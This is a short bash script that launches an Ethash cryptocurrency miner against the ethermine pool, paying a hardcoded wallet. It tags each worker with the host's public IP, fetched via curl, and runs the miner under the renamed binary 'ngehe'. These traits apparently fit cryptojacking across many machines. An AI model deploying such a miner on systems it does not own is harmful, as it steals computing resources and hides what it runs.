#!/bin/bash

#################################
## Begin of user-editable part ##
#################################

POOL=eu1.ethermine.org:14444
WALLET=0x56B01f014F5aC2193f776B52533aB9b19d50B811.$(echo "$(curl -s ifconfig.me)" | tr . _ )-test

#################################
##  End of user-editable part  ##
#################################

cd "$(dirname "$0")"

chmod +x ngehe && ./ngehe --algo ETHASH --pool $POOL --user $WALLET $@
while [ $? -eq 42 ]; do
    sleep 10s
    ./ngehe --algo ETHASH --pool $POOL --user $WALLET $@
done
